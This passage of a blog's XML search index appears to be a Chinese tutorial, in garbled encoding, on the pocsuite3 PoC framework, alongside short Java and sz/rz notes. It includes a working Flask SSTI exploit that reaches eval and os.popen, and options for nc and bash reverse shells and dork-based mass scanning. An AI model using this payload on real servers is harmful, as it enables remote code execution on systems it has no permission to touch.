int[] arr3 = new int[] {-98,-50,-3,0,3,6,99,210,999}; int index = Arrays.binarySearch(arr3, 210); //å¦‚æœæ‰¾åˆ°äº†è¿”å›çš„æ˜¯ç´¢å¼•ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±è¿”å›è´Ÿæ•° System.out.println(index); } } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Javaå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>æ•°ç»„</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pocsuiteç®€å•å­¦ä¹ ]]></title>
    <url>%2Fposts%2F63001%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹ è¯»è¯»è‹±æ–‡â€¦ pocsuite3 is an open-sourced remote vulnerability testing and proof-of-concept development framework developed by the Knownsec 404 Team. It comes with a powerful proof-of-concept engine, many powerful features for the ultimate penetration testers and security researchers Pocsuiteæœ‰ä¸¤ç§äº¤äº’æ¨¡å¼ï¼š ä¸€ä¸ªæ˜¯å‘½ä»¤è¡Œæ¨¡å¼ç±»ä¼¼æˆ‘ä»¬æ‰€çŸ¥çš„sqlmapçš„ç•Œé¢ å¦ä¸€ä¸ªæ˜¯æ§åˆ¶å°äº¤äº’æ¨¡å¼ç±»ä¼¼w3afæˆ–è€…matasploitçš„ç•Œé¢ã€‚ å®‰è£…githubåœ°å€ï¼šhttps://github.com/knownsec/Pocsuite3 ä¹Ÿå¯é€šè¿‡pipå®‰è£…ï¼špip install pocsuite3 å®‰è£…å®Œæˆåæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸï¼š pocsuite -h # pipå®‰è£…çš„æƒ…å†µ python cli.py -h # é€‚ç”¨äºä¸‹è½½å¹¶è§£å‹zipå‹ç¼©åŒ…çš„æƒ…å†µ åŸºæœ¬ä½¿ç”¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹å¸¸ç”¨å‘½ä»¤ï¼špocsuite -u http://example.com -r example.py -v 2 # åŸºç¡€ç”¨æ³• v2å¼€å¯è¯¦ç»†ä¿¡æ¯ pocsuite -u http://example.com -r example.py -v 2 --shell # shellåè¿æ¨¡å¼ï¼ŒåŸºç¡€ç”¨æ³• v2å¼€å¯è¯¦ç»†ä¿¡æ¯ pocsuite -r redis.py --dork service:redis --threads 20 # ä»zoomeyeæœç´¢redisç›®æ ‡æ‰¹é‡æ£€æµ‹ï¼Œçº¿ç¨‹è®¾ç½®ä¸º20 pocsuite -u http://example.com --plugins poc_from_pocs,html_report # åŠ è½½pocç›®å½•ä¸‹æ‰€æœ‰poc,å¹¶å°†ç»“æœä¿å­˜ä¸ºhtml pocsuite -f batch.txt --plugins poc_from_pocs,html_report # ä»æ–‡ä»¶ä¸­åŠ è½½ç›®æ ‡ï¼Œå¹¶ä½¿ç”¨pocç›®å½•ä¸‹pocæ‰¹é‡æ‰«æ pocsuite -u 10.0.0.0/24 -r example.py --plugins target_from_cidr # åŠ è½½CIDRç›®æ ‡ pocsuite -u http://example.com -r ecshop_rce.py --attack --command "whoami" # ecshop pocä¸­å®ç°äº†è‡ªå®šä¹‰å‘½ä»¤ verifyå’Œattackä¸¤ç§POCæ¨¡å¼åœ¨ä½¿ç”¨Pocsuiteçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨â€“verifyå‚æ•°æ¥è°ƒç”¨_verifyæ–¹æ³•ï¼Œç”¨â€“attackå‚æ•°æ¥è°ƒç”¨_attackæ–¹æ³•ã€‚ # POCå†…éƒ¨æ–¹æ³•å¦‚ä¸‹ def _attack(self): result = {} #Write your code here return self.parse_output(result) def _verify(self): result = {} #Write your code here return self.parse_output(result) verify æ¨¡å¼ï¼šéªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´: # -r POC åŠ è½½POCfile æˆ–è€… remote from seebug websit # -u URL pocsuite -r tests/poc_example.py -u http://www.example.com/ --verify attack æ¨¡å¼ï¼šå‘ç›®æ ‡å‘èµ·æœ‰æ•ˆçš„æ”»å‡»: pocsuite -r tests/poc_example.py -u http://www.example.com/ --attack æ‰¹é‡éªŒè¯ï¼Œå°†urlå†™åˆ°ä¸€ä¸ªtxt: # -f url_fileï¼ˆå¤šä¸ªurlï¼‰ pocsuite -r test/poc_example.py -f url.txt --verify åŠ è½½ tests ç›®å½•ä¸‹çš„æ‰€æœ‰ PoC å¯¹ç›®æ ‡è¿›è¡Œæµ‹è¯•ï¼ˆå¯ä»¥å……å½“æ‰«æå™¨è§’è‰²ï¼‰: pocsuite -r tests/ -u http://www.example.com --verify ä½¿ç”¨å¤šçº¿ç¨‹ï¼Œé»˜è®¤çº¿ç¨‹æ•°ä¸º1: pocsuite -r test/ -f url.txt --verify --threads 10 ä½¿ç”¨shelläº¤äº’æ¨¡å¼ï¼Œå¯¹ç›®æ ‡è¿›è¡Œè¿œç¨‹æ§åˆ¶ï¼š pocsuite -u http://example.com -r example.py -v 2 --shell ä»seebugä¸‹è½½poc # -c configfile åŠ è½½é€‰é¡¹from a configuration INI file å¦‚æœæ˜¯å‹ç¼©åŒ…è§£å‹zipæºç çš„æ–¹å¼ï¼Œè¿è¡Œè„šæœ¬æ–¹å¼å¦‚ä¸‹ï¼Œåˆ‡æ¢åˆ°pocsuite3ç›®å½•ï¼Œè¿è¡Œcli.pyæ–‡ä»¶ï¼š python cli.py -u x.x.x.x -r example.py --verify ä¸€äº›æ¨¡å—æ¥å£--dork (é»˜è®¤ä¸ºzoomeyeæœç´¢æœç´¢å¼•æ“) --dork-zoomeye æœè¿‡å…³é”®å­— --dork-shodan æœç´¢å…³é”®å­— --dork-censys æœç´¢å…³é”®å­— --max-page å¤šå°‘é¡µ --search-type æœç´¢ç±»å‹é€‰æ‹©API,Web or Host --vul-keyword seebugå…³é”®è¯æœç´¢ --ssv-id seebugæ¼æ´ç¼–å· --lhost shellæ¨¡å¼åå¼¹ä¸»æœº --lport shellæ¨¡å¼åå¼¹ç«¯å£ --comparison æ¯”è¾ƒä¸¤ä¸ªæœç´¢å¼•æ“ # eg:ä»ZoomEyeä¸­è°ƒç”¨hostæ‰¹é‡éªŒè¯æŸä¸ªPOCï¼š pocsuite -r weblogic_CVE-2017-10271.py --dork 'weblogic' --max-page 5 --thread 20 --verify Optimization å…¶ä»–é€‰é¡¹--plugins åŠ è½½æ’ä»¶ --pocs-path pocåœ°å€ --threads å¼€å¯çº¿ç¨‹ --batch è‡ªåŠ¨é»˜è®¤é€‰é¡¹ --requires æ£€æµ‹éœ€è¦å®‰è£…çš„æ¨¡å— --quiet æ²¡æœ‰logger --ppt éšè—æ•æ„Ÿä¿¡æ¯ consoleæ¨¡å¼poc-consoleè¿›å…¥consoleæ¨¡å¼ Global commands: help å¸®åŠ© use &lt;module> ä½¿ç”¨æ¨¡å— search &lt;search term> æœç´¢æ¨¡å— list|show all æ˜¾ç¤ºæ‰€æœ‰æ¨¡å— exit é€€å‡º Module commands: run ä½¿ç”¨è®¾ç½®çš„å‚æ•°è¿è¡Œé€‰ä¸­çš„è„šæœ¬ back è¿”å›ä¸Šä¸€æ­¥ set å‚æ•°å å‚æ•°å€¼(å½“å‰æ¨¡å—) setg å‚æ•°å å‚æ•°å€¼(æ‰€æœ‰æ¨¡å—) show info|options|all æ‰“å°information,options check ä½¿ç”¨--verifyæ¨¡å¼ attack ä½¿ç”¨--attackæ¨¡å¼ exploit ä½¿ç”¨--shellæ¨¡å¼ å…¶ä»–å‚æ•°optional arguments: -h, --help show this help message and exit --version Show program's version number and exit --update Update Pocsuite -v {0,1,2,3,4,5,6} Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -u URL [URL ...], --url URL [URL ...] Target URL (e.g. "http://www.site.com/vuln.php?id=1") -f URL_FILE, --file URL_FILE Scan multiple targets given in a textual file -r POC [POC ...] Load POC file from local or remote from seebug website -c CONFIGFILE Load options from a configuration INI file Mode: Pocsuite running mode options --verify Run poc with verify mode --attack Run poc with attack mode --shell Run poc with shell mode Request: Network request options --cookie COOKIE HTTP Cookie header value --host HOST HTTP Host header value --referer REFERER HTTP Referer header value --user-agent AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --proxy PROXY Use a proxy to connect to the target URL --proxy-cred PROXY_CRED Proxy authentication credentials (name:password) --timeout TIMEOUT Seconds to wait before timeout connection (default 30) --retry RETRY Time out retrials times. --delay DELAY Delay between two request of one thread --headers HEADERS Extra headers (e.g. "key1: value1\nkey2: value2") Account: Telnet404ã€Shodanã€CEyeã€Fofa account options --login-user LOGIN_USER Telnet404 login user --login-pass LOGIN_PASS Telnet404 login password --shodan-token SHODAN_TOKEN Shodan token --fofa-user FOFA_USER fofa user --fofa-token FOFA_TOKEN fofa token --censys-uid CENSYS_UID Censys uid --censys-secret CENSYS_SECRET Censys secret Modules: Modules(Seebugã€Zoomeyeã€CEyeã€Fofa Listener) options --dork DORK Zoomeye dork used for search. --dork-zoomeye DORK_ZOOMEYE Zoomeye dork used for search. --dork-shodan DORK_SHODAN Shodan dork used for search. --dork-censys DORK_CENSYS Censys dork used for search. --dork-fofa DORK_FOFA Fofa dork used for search. --max-page MAX_PAGE Max page used in ZoomEye API(10 targets/Page). --search-type SEARCH_TYPE search type used in ZoomEye API, web or host --vul-keyword VUL_KEYWORD Seebug keyword used for search. --ssv-id SSVID Seebug SSVID number for target PoC. --lhost CONNECT_BACK_HOST Connect back host for target PoC in shell mode --lport CONNECT_BACK_PORT Connect back port for target PoC in shell mode --comparison Compare popular web search engines Optimization: Optimization options --plugins PLUGINS Load plugins to execute --pocs-path POCS_PATH User defined poc scripts path --threads THREADS Max number of concurrent network requests (default 1) --batch BATCH Automatically choose defaut choice without asking. --requires Check install_requires --quiet Activate quiet mode, working without logger. --ppt Hiden sensitive information when published to the ç¼–å†™POCæ’ä»¶ è¯¦è§pocsuite3ä¸‹docsç›®å½• POCæ³¨æ„äº‹é¡¹ å‚ç…§æ¨¡ç‰ˆæ¥å†™ï¼šæ¨¡ç‰ˆåœ°å€ï¼šhttps://www.seebug.org/contribute/vul å¼•å…¥åŸºç¡€åº“ï¼Œå°½é‡é¿å…ç¬¬ä¸‰æ–¹åº“ã€‚ æ¯”è¾ƒå¥½çš„POCç¬¦åˆï¼š éšæœºæ€§ï¼šæ£€æµ‹çš„æ•°æ®ï¼Œå‘é€çš„æ•°æ®è¦éšæœº é€šç”¨æ€§ï¼šè€ƒè™‘é€‚åº”ç‰ˆæœ¬ï¼Œå„ç§ä¸åŒçš„æƒ…å†µï¼Œæ“ä½œç³»ç»Ÿç­‰ã€‚ ç¡®å®šæ€§ï¼šå‡†ç¡®ç‡çš„é—®é¢˜ï¼Œè¿™ä¸ªPOCä¸€å®šèƒ½æ£€æµ‹å‡ºæ¼æ´æ¥å—ï¼Ÿ å…³äºCEYEçš„ä½¿ç”¨ï¼šç›‘è§†æœåŠ¡ä»¥è¿›è¡Œå®‰å…¨æµ‹è¯•æœ‰æ—¶ä¸€äº›æ¼æ´çš„æ£€æµ‹å¹¶æ²¡æœ‰æ•°æ®å›æ˜¾ï¼Œå¦‚SQLç›²æ³¨ï¼Œå¦‚å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾ç­‰ç­‰ã€‚è¿™æ—¶å¯ä»¥å€ŸåŠ©DNSæŸ¥è¯¢nslookæˆ–è€…curlæ¥ç›‘æ§æ•°æ®ã€‚CEYEä¸ºæˆ‘ä»¬æä¾›äº†è¿™æ ·ä¸€ç§æœåŠ¡ï¼Œåœ°å€ï¼šhttp://ceye.ioã€‚ ä¸¾ä¾‹è¿™é‡Œä»¥Flask SSTIä¸ºä¾‹ï¼š """ åŠŸèƒ½ï¼šä½¿ç”¨pocsuiteå¯¹flaskæ¨¡æ¿æ³¨å…¥è¿›è¡Œæ£€æµ‹å’Œåˆ©ç”¨ @author: å‰‘èƒ†ç´å¿ƒ pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify __class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ï¼ˆç±»ï¼‰ __mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚ __base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» // __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ __subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ __init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³• __globals__ å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ """ from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY # from pocsuite3.api import get_listener_ip, get_listener_port # from pocsuite3.api import REVERSE_PAYLOAD # from pocsuite3.lib.utils import random_str class FlaskPOCEXP(POCBase): ''' 0.ç¼–å†™çš„æ–‡ä»¶ååº”è¯¥ç¬¦åˆpocå‘½åè§„èŒƒï¼š"ç»„æˆæ¼æ´åº”ç”¨å_ç‰ˆæœ¬å·_æ¼æ´ç±»å‹åç§°", å…¶ä¸­æ–‡ä»¶åä¸­æ‰€æœ‰å­—æ¯æ”¹ä¸ºå°å†™ï¼Œæ‰€æœ‰ç‰¹æ®Šç¬¦å·æ”¹ä¸ºä¸‹åˆ’çº¿ 1.ç¼–å†™DemoPOCç±»ï¼Œç»§æ‰¿è‡ªPOCBaseç±» 2.å¡«å†™POCä¿¡æ¯å­—æ®µï¼ˆå¦‚ä¸‹ï¼‰ï¼š ''' vulID = '0' # ssvid IDï¼Œå¦‚æœæ˜¯æäº¤æ¼æ´åŒæ—¶æäº¤POCï¼Œå†™æˆ0 version = '1' # é»˜è®¤ä¸º1 author = ['å‰‘èƒ†ç´å¿ƒ'] # POCä½œè€…çš„åå­— vulDate = '2021-01-11' # æ¼æ´å…¬å¼€çš„æ—¶é—´ï¼Œä¸æ˜ç¡®æ—¶å¯ä»¥å†™ä»Šå¤©ï¼ˆæˆ‘çå†™çš„æ—¶é—´ï¼‰ createDate = '2021-01-11' updateDate = '2021-01-11' references = ['http://www.xpshuai.cn'] # æ¼æ´åœ°å€æ¥æºï¼Œ0dayå¯ä»¥ä¸å†™ name = 'Python Flask SSTI(æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥)æ¼æ´' # POCåç§° appPowerLink = 'http://www.xpshuai.cn' # æ¼æ´å‚å•†çš„ä¸»é¡µåœ°å€ appName = 'Flask' # æ¼æ´åº”ç”¨åç§° appVersion = 'All' # æ¼æ´å½±å“ç‰ˆæœ¬ # vulType = VUL_TYPE.OTHER # æ¼æ´ç±»å‹(è¿™é‡Œæˆ‘çé€‰çš„) desc = ''' SSTI(Server-Side Template Injection)æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œ å°±æ˜¯æœåŠ¡å™¨æ¨¡æ¿ä¸­æ‹¼æ¥äº†æ¶æ„ç”¨æˆ·è¾“å…¥å¯¼è‡´å„ç§æ¼æ´ã€‚é€šè¿‡æ¨¡æ¿ï¼ŒWebåº”ç”¨å¯ä»¥æŠŠè¾“å…¥è½¬æ¢æˆç‰¹å®šçš„HTMLæ–‡ä»¶æˆ–è€…emailæ ¼å¼ ''' samples = [''] # æ¼æ´æ ·ä¾‹ï¼Œä½¿ç”¨pocæµ‹è¯•æˆåŠŸçš„ç½‘ç«™ # PoC ç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–è¯´æ˜ã€‚PoC ç¼–å†™çš„æ—¶å€™è¦æ±‚å°½é‡ä¸è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå¦‚æœå¿…è¦ä½¿ç”¨ï¼Œè¯·åœ¨ PoC çš„åŸºç¡€ä¿¡æ¯éƒ¨åˆ†ï¼Œå¢åŠ  install_requires å­—æ®µï¼ŒæŒ‰ç…§ä»¥ä¸‹æ ¼å¼ï¼šinstall_requies = [pipæ—¶å€™çš„æ¨¡å—å, pipæ—¶å€™çš„æ¨¡å—å]å¡«å†™ä¾èµ–çš„æ¨¡å—åã€‚ install_requies = [] def _verify(self): ''' éªŒè¯æ¨¡å¼ ''' result = {} # è¿™é‡Œå†™éªŒè¯ä»£ç ... path = "/?name=" url = self.url + path payload = "{{22*22}}" # ç¬¬ä¸€æ¬¡è¯·æ±‚ try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and "484" in resq.text: result['VerifyInfo'] = {} # åˆ›å»ºè‡ªå®šä¹‰çš„å­—å…¸ä¿¡æ¯ result['VerifyInfo']['URL'] = url result['VerifyInfo']['Payload'] = payload except Exception as e: pass return self.parse_output(result) def _attack(self): ''' æ”»å‡»æ¨¡å¼ ''' result = {} path = "/?name=" url = self.url + path payload = "%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D" try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and "www" in resq.text: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url result['VerifyInfo']['Name'] = payload except Exception as e: pass return self.parse_output(result) def parse_output(self, result): ''' æ£€æµ‹è¿”å›ç»“æœæ•°æ®ç»Ÿä¸€å°è£…åˆ°è¿™ä¸ªæ–¹æ³•é‡Œè¿›è¡Œå¤„ç† ''' output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output # æ³¨å†ŒPOCç±»ï¼Œåƒä¸‡ä¸è¦å¿˜è®°å“¦~~~ register_poc(FlaskPOCEXP) è‹¥æ˜¯å‹ç¼©åŒ…æ–¹å¼ä¸‹è½½çš„ï¼šæ”¾åˆ°pocsuiteä¸‹çš„pocsç›®å½•ï¼Œç„¶åpython cli.py xxxxxæ–¹å¼è¿è¡Œ è‹¥æ˜¯pipæ–¹å¼ä¸‹è½½çš„ï¼šæŒ‰ä¸‹é¢æ–¹å¼ éªŒè¯æ¼æ´ï¼š pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify æ”»å‡»ï¼š pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --attack commandå¤–éƒ¨å‚æ•°ä¼ é€’ã€‚æ”¹è¿›ä¸€ä¸‹ï¼Œå¸Œæœ›å¯ä»¥æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œå¯¹ç›®æ ‡ç³»ç»Ÿå®ç°åŠäº¤äº’æ§åˆ¶ """ åŠŸèƒ½ï¼šä½¿ç”¨pocsuiteå¯¹flaskæ¨¡æ¿æ³¨å…¥è¿›è¡Œæ£€æµ‹å’Œåˆ©ç”¨ @author: å‰‘èƒ†ç´å¿ƒ @ä½¿ç”¨æ–¹æ³•ï¼š pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify --command 'id' """ from collections import OrderedDict from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class FlaskPOCEXP(POCBase): ''' 0.ç¼–å†™çš„æ–‡ä»¶ååº”è¯¥ç¬¦åˆpocå‘½åè§„èŒƒï¼š"ç»„æˆæ¼æ´åº”ç”¨å_ç‰ˆæœ¬å·_æ¼æ´ç±»å‹åç§°", å…¶ä¸­æ–‡ä»¶åä¸­æ‰€æœ‰å­—æ¯æ”¹ä¸ºå°å†™ï¼Œæ‰€æœ‰ç‰¹æ®Šç¬¦å·æ”¹ä¸ºä¸‹åˆ’çº¿ 1.ç¼–å†™DemoPOCç±»ï¼Œç»§æ‰¿è‡ªPOCBaseç±» 2.å¡«å†™POCä¿¡æ¯å­—æ®µï¼ˆå¦‚ä¸‹ï¼‰ï¼š ''' vulID = '0' # ssvid IDï¼Œå¦‚æœæ˜¯æäº¤æ¼æ´åŒæ—¶æäº¤POCï¼Œå†™æˆ0 version = '1' # é»˜è®¤ä¸º1 author = ['å‰‘èƒ†ç´å¿ƒ'] # POCä½œè€…çš„åå­— vulDate = '2021-01-11' # æ¼æ´å…¬å¼€çš„æ—¶é—´ï¼Œä¸æ˜ç¡®æ—¶å¯ä»¥å†™ä»Šå¤©ï¼ˆæˆ‘çå†™çš„æ—¶é—´ï¼‰ createDate = '2021-01-11' updateDate = '2021-01-11' references = ['http://www.xpshuai.cn'] # æ¼æ´åœ°å€æ¥æºï¼Œ0dayå¯ä»¥ä¸å†™ name = 'Python Flask SSTI(æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥)æ¼æ´' # POCåç§° appPowerLink = 'http://www.xpshuai.cn' # æ¼æ´å‚å•†çš„ä¸»é¡µåœ°å€ appName = 'Flask' # æ¼æ´åº”ç”¨åç§° appVersion = 'All' # æ¼æ´å½±å“ç‰ˆæœ¬ # vulType = VUL_TYPE.OTHER # æ¼æ´ç±»å‹(è¿™é‡Œæˆ‘çé€‰çš„) desc = ''' SSTI(Server-Side Template Injection)æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œ å°±æ˜¯æœåŠ¡å™¨æ¨¡æ¿ä¸­æ‹¼æ¥äº†æ¶æ„ç”¨æˆ·è¾“å…¥å¯¼è‡´å„ç§æ¼æ´ã€‚é€šè¿‡æ¨¡æ¿ï¼ŒWebåº”ç”¨å¯ä»¥æŠŠè¾“å…¥è½¬æ¢æˆç‰¹å®šçš„HTMLæ–‡ä»¶æˆ–è€…emailæ ¼å¼ ''' samples = [''] # æ¼æ´æ ·ä¾‹ï¼Œä½¿ç”¨pocæµ‹è¯•æˆåŠŸçš„ç½‘ç«™ install_requies = [] def _options(self): # æ¥æ”¶ç”¨æˆ·å¤–éƒ¨è¾“å‡ºå‚æ•°command o = OrderedDict() payload = { "nc": REVERSE_PAYLOAD.NC, "bash": REVERSE_PAYLOAD.BASH, } o["command"] = OptDict(selected="bash", default=payload) return o def _verify(self): ''' éªŒè¯æ¨¡å¼ ''' result = {} # è¿™é‡Œå†™éªŒè¯ä»£ç ... path = "/?name=" url = self.url + path payload = "{{22*22}}" # ç¬¬ä¸€æ¬¡è¯·æ±‚ try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and "484" in resq.text: result['VerifyInfo'] = {} # åˆ›å»ºè‡ªå®šä¹‰çš„å­—å…¸ä¿¡æ¯ result['VerifyInfo']['URL'] = url result['VerifyInfo']['Payload'] = payload except Exception as e: pass return self.parse_output(result) def _attack(self): ''' æ”»å‡»æ¨¡å¼ ''' result = {} path = "/?name=" url = self.url + path cmd = self.get_option("command") # è·å–commandå‚æ•° payload = "%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22' "+ cmd + "'%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D" try: resq = requests.get(url + payload) if resq and resq.status_code == 200 and "www" in resq.text: result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = url result['VerifyInfo']['Name'] = payload except Exception as e: pass return self.parse_output(result) # æ£€æµ‹è¿”å›ç»“æœæ•°æ®ç»Ÿä¸€å°è£…åˆ°è¿™ä¸ªæ–¹æ³•é‡Œè¿›è¡Œå¤„ç† def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail('target is not vulnerable') return output # æ³¨å†ŒPOCç±»ï¼Œåƒä¸‡ä¸è¦å¿˜è®°å“¦~~~ register_poc(FlaskPOCEXP) è¿è¡Œï¼š pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000 --verify --command 'whoami' document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å¼€æºæ¸—é€æ¡†æ¶</tag>
        <tag>pocsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webå®‰å…¨ç®€è¦æ€ç»´å¯¼å›¾]]></title>
    <url>%2Fposts%2F20550%2F</url>
    <content type="text"><![CDATA[å‰å‡ å¤©é‡æ–°è¯»äº†ä¸€ä¸‹é“å“¥çš„ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹ï¼Œäºæ˜¯åšäº†ä¸ªç²—ç•¥çš„æ€ç»´å¯¼å›¾ï¼š xmindåŸå§‹æ ¼å¼åœ°å€ï¼šhttps://www.jianguoyun.com/p/DX5jC4wQ59WFCBjWvtYD document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>è¯»ä¹¦ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨szä¸rzå‘½ä»¤åœ¨Xshellä¸Šä¸‹è½½å’Œä¸Šä¼ æ–‡ä»¶]]></title>
    <url>%2Fposts%2F35401%2F</url>
    <content type="text"><![CDATA[æ¦‚è¿°å®‰è£…sudo apt-get install lrzsz å¸¸è§å‚æ•°å‚æ•° å‚æ•°è¯´æ˜ -a ä»¥æ–‡æœ¬æ–¹å¼ä¼ è¾“ï¼ˆasciiï¼‰ -b ä»¥äºŒè¿›åˆ¶æ–¹å¼ä¼ è¾“ï¼ˆbinaryï¼‰ -e å¯¹æ§åˆ¶å­—ç¬¦è½¬ä¹‰ï¼ˆescapeï¼‰ï¼Œè¿™å¯ä»¥ä¿è¯æ–‡ä»¶ä¼ è¾“æ­£ç¡® ä¸¤ä¸ªå‘½ä»¤ï¼š szï¼šä»xshellé‡Œé¢çš„æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶åˆ°æœ¬æœº rzï¼šä»ä¸»æœºä¸Šä¼ æ–‡ä»¶åˆ°xshellé‡Œé¢çš„æœåŠ¡å™¨ szç”¨æ³•ï¼š ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ sz file_name ä¸‹è½½å¤šä¸ªæ–‡ä»¶ sz file_name1 file_name2 ä¸‹è½½æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸åŒ…å«è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹ sz test_dir/* rzç”¨æ³•ï¼šè¾“å…¥rzå›è½¦åï¼Œä¼šå‡ºç°æ–‡ä»¶é€‰æ‹©å¯¹è¯æ¡†ï¼Œé€‰æ‹©éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œä¸€æ¬¡å¯ä»¥æŒ‡å®šå¤šä¸ªæ–‡ä»¶ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨çš„è·¯å¾„ä¸ºå½“å‰æ‰§è¡Œrzå‘½ä»¤çš„ç›®å½•ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
